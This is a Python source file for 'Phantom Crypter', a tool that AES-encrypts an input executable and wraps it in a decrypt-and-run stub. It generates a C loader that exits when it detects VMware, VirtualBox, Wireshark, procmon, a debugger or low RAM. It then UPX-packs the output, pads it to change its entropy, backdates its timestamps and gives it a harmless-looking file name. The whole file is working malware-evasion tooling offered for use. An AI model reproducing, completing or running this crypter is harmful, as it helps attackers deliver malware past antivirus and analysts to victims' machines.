#!/usr/bin/env python3
"""
Phantom Crypter - Advanced Multi-Layer Evasion System
Creates heavily obfuscated and packed payloads with anti-detection techniques
"""

import os
import sys
import subprocess
import shutil
import random
import string
import hashlib
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes
import base64

class PhantomCrypter:
    def __init__(self):
        self.temp_dir = "temp_crypto"
        self.output_dir = "phantom_output"
        self.upx_path = "/usr/bin/upx"
        
    def setup_directories(self):
        """Create necessary directories"""
        os.makedirs(self.temp_dir, exist_ok=True)
        os.makedirs(self.output_dir, exist_ok=True)
        
    def apply_metamorphic_encryption(self, file_path):
        """Apply polymorphic encryption to binary"""
        print("[+] Applying metamorphic encryption...")
        
        with open(file_path, 'rb') as f:
            data = f.read()
        
        # Generate random key and IV
        key = get_random_bytes(32)
        iv = get_random_bytes(16)
        
        # Encrypt with AES
        cipher = AES.new(key, AES.MODE_CBC, iv)
        
        # Pad data to multiple of 16
        pad_len = 16 - (len(data) % 16)
        padded_data = data + bytes([pad_len] * pad_len)
        
        encrypted_data = cipher.encrypt(padded_data)
        
        # Create stub with embedded key/iv
        stub_code = f'''
import base64
from Crypto.Cipher import AES
import os
import subprocess
import tempfile

key = {repr(key)}
iv = {repr(iv)}
encrypted_payload = {repr(base64.b64encode(encrypted_data).decode())}

def decrypt_and_execute():
    try:
        # Anti-sandbox delays
        import time
        time.sleep(random.randint(5, 15))
        
        # Decrypt payload
        cipher = AES.new(key, AES.MODE_CBC, iv)
        encrypted_bytes = base64.b64decode(encrypted_payload)
        decrypted_data = cipher.decrypt(encrypted_bytes)
        
        # Remove padding
        pad_len = decrypted_data[-1]
        original_data = decrypted_data[:-pad_len]
        
        # Write to temp file and execute
        with tempfile.NamedTemporaryFile(suffix='.exe', delete=False) as tmp:
            tmp.write(original_data)
            tmp_path = tmp.name
        
        os.chmod(tmp_path, 0o755)
        subprocess.Popen([tmp_path], shell=True)
        
        # Clean up
        os.unlink(tmp_path)
        
    except Exception:
        pass

if __name__ == "__main__":
    decrypt_and_execute()
'''
        
        stub_path = os.path.join(self.temp_dir, "phantom_stub.py")
        with open(stub_path, 'w') as f:
            f.write(stub_code)
        
        return stub_path
    
    def create_pe_loader(self, encrypted_path):
        """Create PE loader with anti-analysis"""
        print("[+] Creating PE loader with anti-analysis...")
        
        loader_code = '''
#include <windows.h>
#include <stdio.h>
#include <time.h>
#include <tlhelp32.h>

// Anti-VM checks
BOOL IsRunningInVM() {
    // Check VMware
    HKEY hKey;
    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, "SOFTWARE\\VMware, Inc.\\VMware Tools", 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
        RegCloseKey(hKey);
        return TRUE;
    }
    
    // Check VirtualBox
    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, "SOFTWARE\\Oracle\\VirtualBox Guest Additions", 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
        RegCloseKey(hKey);
        return TRUE;
    }
    
    // Check process list
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot != INVALID_HANDLE_VALUE) {
        PROCESSENTRY32 pe32;
        pe32.dwSize = sizeof(PROCESSENTRY32);
        
        if (Process32First(hSnapshot, &pe32)) {
            do {
                if (strstr(pe32.szExeFile, "vmware") || strstr(pe32.szExeFile, "vbox") || 
                    strstr(pe32.szExeFile, "wireshark") || strstr(pe32.szExeFile, "procmon")) {
                    CloseHandle(hSnapshot);
                    return TRUE;
                }
            } while (Process32Next(hSnapshot, &pe32));
        }
        CloseHandle(hSnapshot);
    }
    
    return FALSE;
}

// Anti-debug checks
BOOL IsDebuggerPresent2() {
    return IsDebuggerPresent() || CheckRemoteDebuggerPresent(GetCurrentProcess(), NULL);
}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    // Anti-analysis delays
    Sleep(rand() % 10000 + 5000);
    
    // Environment checks
    if (IsRunningInVM() || IsDebuggerPresent2()) {
        ExitProcess(0);
    }
    
    // Resource checks
    MEMORYSTATUSEX memInfo;
    memInfo.dwLength = sizeof(MEMORYSTATUSEX);
    GlobalMemoryStatusEx(&memInfo);
    if (memInfo.ullTotalPhys < (2ULL * 1024 * 1024 * 1024)) { // Less than 2GB RAM
        ExitProcess(0);
    }
    
    // Execute payload via embedded Python
    system("python phantom_stub.py");
    
    return 0;
}
'''
        
        loader_path = os.path.join(self.temp_dir, "phantom_loader.c")
        with open(loader_path, 'w') as f:
            f.write(loader_code)
        
        # Compile with MinGW (would need to be installed)
        exe_path = os.path.join(self.temp_dir, "phantom_loader.exe")
        compile_cmd = f"gcc -o {exe_path} {loader_path} -ladvapi32 -static"
        
        try:
            subprocess.run(compile_cmd, shell=True, check=True)
            return exe_path
        except subprocess.CalledProcessError:
            print("[-] C compilation failed, using Python stub instead")
            return encrypted_path
    
    def apply_upx_packing(self, file_path):
        """Apply UPX packing with custom options"""
        print("[+] Applying UPX packing...")
        
        if not os.path.exists(self.upx_path):
            print("[-] UPX not found, skipping packing")
            return file_path
        
        packed_path = file_path.replace('.exe', '_packed.exe')
        
        # Use maximum compression with custom options
        upx_cmd = [
            self.upx_path,
            '--ultra-brute',
            '--compress-exports=1',
            '--compress-icons=2',
            '--strip-relocs=1',
            '--best',
            '-q',
            file_path,
            '-o', packed_path
        ]
        
        try:
            subprocess.run(upx_cmd, check=True, capture_output=True)
            return packed_path
        except subprocess.CalledProcessError:
            print("[-] UPX packing failed, continuing without packing")
            return file_path
    
    def inject_entropy(self, file_path):
        """Inject random data to increase entropy"""
        print("[+] Injecting entropy...")
        
        with open(file_path, 'rb') as f:
            data = f.read()
        
        # Add random overlay data
        junk_size = random.randint(2048, 8192)
        junk_data = bytes([random.randint(0, 255) for _ in range(junk_size)])
        
        entropy_path = file_path.replace('.exe', '_entropy.exe')
        with open(entropy_path, 'wb') as f:
            f.write(data + junk_data)
        
        return entropy_path
    
    def modify_timestamps(self, file_path):
        """Modify file timestamps to appear legitimate"""
        print("[+] Modifying timestamps...")
        
        # Set to a date that appears legitimate (e.g., 6 months ago)
        import time
        old_time = time.time() - (6 * 30 * 24 * 60 * 60)  # 6 months ago
        os.utime(file_path, (old_time, old_time))
    
    def create_icon_resource(self):
        """Create legitimate-looking icon"""
        # This would require additional libraries for icon creation
        # For now, just return None
        return None
    
    def process_file(self, input_file):
        """Main processing pipeline"""
        print(f"[+] Processing {input_file} with Phantom Crypter")
        
        self.setup_directories()
        
        # Copy original file
        temp_file = os.path.join(self.temp_dir, "original.exe")
        shutil.copy2(input_file, temp_file)
        
        # Apply metamorphic encryption
        encrypted_file = self.apply_metamorphic_encryption(temp_file)
        
        # Create PE loader (if possible)
        loaded_file = self.create_pe_loader(encrypted_file)
        
        # Apply UPX packing
        packed_file = self.apply_upx_packing(loaded_file)
        
        # Inject entropy
        entropy_file = self.inject_entropy(packed_file)
        
        # Modify timestamps
        self.modify_timestamps(entropy_file)
        
        # Create final output
        final_name = f"phantom_smart_renewal_{random.randint(1000, 9999)}.exe"
        final_path = os.path.join(self.output_dir, final_name)
        shutil.copy2(entropy_file, final_path)
        
        # Calculate hashes
        with open(final_path, 'rb') as f:
            data = f.read()
            md5_hash = hashlib.md5(data).hexdigest()
            sha256_hash = hashlib.sha256(data).hexdigest()
        
        print(f"[+] Final payload created: {final_path}")
        print(f"[+] MD5: {md5_hash}")
        print(f"[+] SHA256: {sha256_hash}")
        print(f"[+] Size: {len(data)} bytes")
        
        # Cleanup temp directory
        shutil.rmtree(self.temp_dir, ignore_errors=True)
        
        return final_path

def main():
    if len(sys.argv) != 2:
        print("Usage: python3 phantom_crypter.py <input_exe>")
        sys.exit(1)
    
    input_file = sys.argv[1]
    if not os.path.exists(input_file):
        print(f"Error: {input_file} not found")
        sys.exit(1)
    
    crypter = PhantomCrypter()
    crypter.process_file(input_file)

if __name__ == "__main__":
    main()